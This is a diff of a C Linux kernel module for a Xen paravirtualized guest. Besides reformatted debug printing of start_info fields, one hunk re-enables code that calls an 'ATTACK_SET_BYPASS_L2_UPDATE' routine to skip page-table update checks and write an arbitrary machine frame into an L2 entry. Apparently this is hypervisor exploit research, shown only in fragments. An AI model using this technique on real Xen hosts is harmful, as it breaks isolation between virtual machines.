@@ -66,30 +66,26 @@ static void* l2_entry_va;
 void print_xen_start_info_content(void){
 	struct start_info *x = xen_start_info;
 printk("\n\n\
-  char magic[32]='%s'\t\t/* 'xen-<version>-<platform>'.            */\n\
-  unsigned long nr_pages=%ld\t\t\t/* Total pages allocated to this domain.  */\n\
+  char magic[32]='%s'\t/*'xen-<version>-<platform>'*/\n\
+  unsigned long nr_pages=%ld\t/* Total pages allocated to this domain.  */\n\
   unsigned long shared_info=%p\t/* MACHINE address of shared info struct. */\n\
-  uint32_t flags=%X\t\t\t\t/* SIF_xxx flags.                         */\n\
-  xen_pfn_t store_mfn=%ld\t\t/* MACHINE page number of shared page.    */\n\
-  uint32_t store_evtchn=%d\t\t/* Event channel for store communication. */\n\
+  uint32_t flags=%X\t/* SIF_xxx flags.*/\n\
+  xen_pfn_t store_mfn=%ld\t/* MACHINE page number of shared page.*/\n\
+  uint32_t store_evtchn=%d\t/* Event channel for store communication. */\n\
   union {\n\
     struct {\n\
-            xen_pfn_t mfn=%ld\t/* MACHINE page number of console page.   */\n\
-            uint32_t  evtchn=%d\t/* Event channel for console page.        */\n\
-    } domU;\n\
-    struct {\n\
-            uint32_t info_off;  /* Offset of console_info struct.         */\n\
-            uint32_t info_size; /* Size of console_info struct from start.*/\n\
-    } dom0;\n", x->magic, x->nr_pages, (void *) x->shared_info, x->flags, x->store_mfn,
+            xen_pfn_t mfn=%ld\t/* MACHINE page number of console page.*/\n\
+            uint32_t  evtchn=%d\t/* Event channel for console page.*/\n\
+    } domU;\n", x->magic, x->nr_pages, (void *) x->shared_info, x->flags, x->store_mfn,
 x->store_evtchn,x->console.domU.mfn, x->console.domU.evtchn);
 
 printk("  } console;\n\
-  /* THE FOLLOWING ARE ONLY FILLED IN ON INITIAL BOOT (NOT RESUME).     */\n\
-  unsigned long pt_base=%p\t\t/* VIRTUAL address of page directory.     */\n\
-  unsigned long nr_pt_frames=%ld\t\t\t/* Number of bootstrap p.t. frames.       */\n\
-  unsigned long mfn_list=%p\t/* VIRTUAL address of page-frame list.    */\n\
-  unsigned long mod_start=%p\t/* VIRTUAL address of pre-loaded module.  */\n\
-  unsigned long mod_len=%ld\t/* Size (bytes) of pre-loaded module.     */\n\
+  /* THE FOLLOWING ARE ONLY FILLED IN ON INITIAL BOOT (NOT RESUME).*/\n\
+  unsigned long pt_base=%p\t/* VIRTUAL address of page directory.*/\n\
+  unsigned long nr_pt_frames=%ld\t/* Number of bootstrap p.t. frames.*/\n\
+  unsigned long mfn_list=%p\t/* VIRTUAL address of page-frame list.  */\n\
+  unsigned long mod_start=%p\t/* VIRTUAL address of pre-loaded module.*/\n\
+  unsigned long mod_len=%ld\t/* Size (bytes) of pre-loaded module. */\n\
   int8_t cmd_line[MAX_GUEST_CMDLINE]%s\n\
 ",(void *) x->pt_base,x->nr_pt_frames,(void *) x->mfn_list,(void *) x->mod_start, 
 x->mod_len, x->cmd_line
@@ -302,12 +298,12 @@ void do_page_buff(unsigned long mfn, char *buff, int what)
     DEBUG("l2_entry pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va));
     DEBUG("l2_entry pmd->pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va)->pmd);
 
-	//set_l2_pse_flag((unsigned long) l2_entry_va);
+	set_l2_pse_flag((unsigned long) l2_entry_va);
     DEBUG("bypassing the l2 pointer");
     bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
     DEBUG("Attributing the l2 address to l2_entry_va");
-//	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
-	*(unsigned long*) l2_entry_va = 1231231L;
+	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
+//	*(unsigned long*) l2_entry_va = 1231231L;
     DEBUG("disabling the bypass");
     bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
 	//unset_l2_pse_flag((unsigned long) l2_entry_va);
@@ -324,11 +320,11 @@ void do_page_buff(unsigned long mfn, char *buff, int what)
 	}
 
     DEBUG("Reset process");
-	//set_l2_pse_flag((unsigned long) l2_entry_va);
+	set_l2_pse_flag((unsigned long) l2_entry_va);
     bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
 	*(unsigned long*) l2_entry_va = 0;
     bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
-	//unset_l2_pse_flag((unsigned long) l2_entry_va);
+	unset_l2_pse_flag((unsigned long) l2_entry_va);
     DEBUG("Exit page_buff");
 }
 
@@ -575,6 +571,7 @@ void map_shared_info(void){
         printk("__va(shared_info)\t%lx\n", __va(xen_start_info->shared_info));
         set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
         HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
+        printk("HYPERVISOR_shared_info\t%lx\n",HYPERVISOR_shared_info);
     } else{
         HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
     }
@@ -596,18 +593,18 @@ void print_my_arch_info(void)
 {
     xen_pfn_t *mfn_list = (xen_pfn_t *) get_zeroed_page(__GFP_ZERO);
 
+    printk("pm2_cr3\t%ld\n",my_arch->p2m_cr3);
     printk("max_pfn\t%ld\n",my_arch->max_pfn);
-    xen_pfn_t pfmfll =  my_arch->pfn_to_mfn_frame_list_list << PAGE_SHIFT;
-    set_fixmap(FIX_PARAVIRT_BOOTMAP, pfmfll);
-    pfmfll = fix_to_virt(FIX_PARAVIRT_BOOTMAP);
-    printk("pfn_to_mfn_frame_list_list\t%lx\n",pfmfll);
+    xen_pfn_t fll =  my_arch->pfn_to_mfn_frame_list_list << PAGE_SHIFT;
+    printk("fll\t%lx\n",fll);
+    printk("__va(fll)\t%lx\n",__va(fll));
     /*
     struct page *pg = pfn_to_page(my_arch->pfn_to_mfn_frame_list_list);
     get_page(pg);
     xen_pfn_t *mfn_list = (xen_pfn_t*)kmap(pg);
-    */
-    memcpy((void*) mfn_list,(void*) pfmfll, PAGE_SIZE);
+    memcpy((void*) mfn_list,(void*) fll, PAGE_SIZE);
     printk("mfn_list[0]\t%lx\n",mfn_list[0]);
+    */
 
 
 }
@@ -652,6 +649,15 @@ static int __init hc_xen_ver_init(void) {
 	unsigned long ret = 0;
     printk("Loading the hc_xen_ver : %s\n",__FUNCTION__);
     print_xen_start_info_content();
+    DEBUG("Page Walk of x->pt_base");
+    page_walk(xen_start_info->pt_base, 0);
+    unsigned long *fl = (unsigned long *)xen_start_info->mfn_list;
+    int i;
+    for(i=0; i< xen_start_info->nr_pt_frames; i++){
+        DEBUG("fl[%d] = %lx",i,fl[i]);
+    }
+
+    //return 0;
 
     if (clear)
     {
@@ -761,7 +767,7 @@ static int __init hc_xen_ver_init(void) {
 
 
     //test_mmu_update();
-    return 0;
+    //return 0;
     // mdelay(100);
 
     //printk("\n\n");
